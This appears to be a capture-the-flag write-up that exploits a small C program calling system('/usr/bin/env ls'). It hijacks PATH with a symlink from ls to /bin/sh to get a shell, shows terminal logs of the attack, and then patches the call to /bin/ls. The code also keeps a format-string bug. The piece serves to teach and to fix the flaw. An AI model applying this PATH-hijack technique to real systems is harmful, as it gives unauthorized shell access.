This challenge doesn't differ for 32 bit or 64 bit.

Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main()
{
	char buf0[50];
	char buf1[50];

	while (1 == 1)
	{
		puts("Since we are falling down a bottoless pit, what do you want to do?");
		fgets(buf0, sizeof(buf0), stdin);
		
		if (strncmp(buf0, "0", 1) == 0)
		{
			fgets(buf0, sizeof(buf0), stdin);
		}

		if (strncmp(buf0, "1", 1) == 0)
		{
			system("/usr/bin/env ls");
		}

		if (strncmp(buf0, "2", 1) == 0)
		{
			printf(buf1);	
		}
	}
}
```

So when we look at the source code we see that we are essentially looped infinitly with a menu with 3 options. The first will allow us to write data to the buf0 buffer, however not enough to do a buffer overflow. The second option uses /usr/bin/env, which is a program that retrieves the directory path of something like python, echo, or in this case the ls program. This is based off of the PATH environement variable and cad be modified. Looking at the last option, we see that it has a format string vulnerabillity, however we have no pheasable way of storing input in buf1, so that option isn't going to work.

So reviewing our three options, the env seems to be the best. Thing is, then env utillity relies on the Path enviornment variable which can be modified. First let's see how it works.

```
guyinatuxedo@tux:/Hackery/escape/endless_pit/e3 (master)$ /usr/bin/env ls
e3  e3.c
guyinatuxedo@tux:/Hackery/escape/endless_pit/e3 (master)$ ls
e3  e3.c
```

As you can see, the output didn't differ at all because the env binary provided the correct path for the ks program. However what if we were to create a symbolic link of ls pointing to /bin/sh, export it to the PATH enviroment variable, then ran it?

```
guyinatuxedo@tux:/Hackery/escape/endless_pit/e3 (master)$ ln -s /bin/sh ls
guyinatuxedo@tux:/Hackery/escape/endless_pit/e3 (master)$ export PATH=.:$PATH
guyinatuxedo@tux:/Hackery/escape/endless_pit/e3 (master)$ /usr/bin/env ls
$ echo I have a shell!
I have a shell!
$ exit
```

As you can see, my modifieng the PATH enviorment variable, we got /usr/bin/env to run /bin/sh when we asked it to run ls. Let's see if the program will do the same thing.

```
guyinatuxedo@tux:/Hackery/escape/endless_pit/e3 (master)$ ./e3
Since we are falling down a bottoless pit, what do you want to do?
1
$ ls
$ echo is this working?
is this working?
$ cat out
Really, you can do anything you want and you want to leave!?
$ exit
$ exit
Since we are falling down a bottoless pit, what do you want to do? Level Cleared!
^C
```

As you can see, we got the binary to give us a shell by modifiing the Path variable. You can also see that as a result of this exploit, while we have the PATH enviornment variable changed for ls, ls no longer works. But we got a shell, and just like that we pwned the binary. Now let's patch it!

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main()
{
	char buf0[50];
	char buf1[50];

	while (1 == 1)
	{
		puts("Since we are falling down a bottoless pit, what do you want to do?");
		fgets(buf0, sizeof(buf0), stdin);
		
		if (strncmp(buf0, "0", 1) == 0)
		{
			fgets(buf0, sizeof(buf0), stdin);
		}

		if (strncmp(buf0, "1", 1) == 0)
		{
			system("/bin/ls");
		}

		if (strncmp(buf0, "2", 1) == 0)
		{
			printf(buf1);	
		}
	}
}
```

Let's test it, with the PATH variable changed like we did to exploit this challeng.

```
guyinatuxedo@tux:/Hackery/escape/endless_pit/e3 (master)$ ./e3
Since we are falling down a bottoless pit, what do you want to do?
1
$ exit
Since we are falling down a bottoless pit, what do you want to do?
^C 
guyinatuxedo@tux:/Hackery/escape/endless_pit/e3 (master)$ ./e3_secure 
Since we are falling down a bottoless pit, what do you want to do?
1
e3  e3.c  e3_secure  e3_secure.c  ls  out
Since we are falling down a bottoless pit, what do you want to do?
1
e3  e3.c  e3_secure  e3_secure.c  ls  out
Since we are falling down a bottoless pit, what do you want to do?
```

Just like that, we patched the binary!
